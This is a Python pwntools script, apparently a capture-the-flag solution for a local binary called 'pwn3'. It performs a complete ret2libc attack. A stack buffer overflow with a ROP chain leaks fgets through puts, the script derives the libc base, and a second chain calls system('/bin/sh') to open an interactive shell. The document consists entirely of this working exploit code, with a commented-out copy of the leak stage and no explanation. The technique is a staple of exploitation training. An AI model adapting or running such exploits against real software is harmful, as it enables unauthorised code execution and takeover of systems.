#!/usr/bin/python3

from pwn import *

elf = ELF("./pwn3")
rop = ROP("./pwn3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

junk = b"A"*40

pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]
print(hex(pop_rdi))
io = elf.process()
payload = flat([
junk,
p64(pop_rdi),
p64(elf.got.fgets),
p64(elf.plt.puts),
p64(elf.symbols.main),
])


io.sendline(payload)
io.readline()
io.readline()
leakfgets = u64(io.readline().strip().ljust(8,b"\x00"))

log.info(f"{hex(leakfgets)=}")

libc.address = leakfgets - libc.symbols.fgets

log.info(f"{hex(libc.address)=}")

BIN_SH=next(libc.search(b'/bin/sh\x00'))

payload2 = flat([
junk,
p64(pop_rdi),
p64(BIN_SH),
p64(rop.find_gadget(['ret'])[0]),
p64(libc.symbols.system),
])

io.sendline(payload2)
io.interactive()

# payload2 = flat([
# junk,
# p64(pop_rdi),
# p64(elf.got.fgets),
# p64(elf.plt.puts),
# ])
#
# io.sendline(payload2)
# io.readline()
# io.readline()
#
# leakfgets = u64(io.readline().strip().ljust(8,b"\x00"))
#
# log.info(f"{hex(leakfgets)=}")
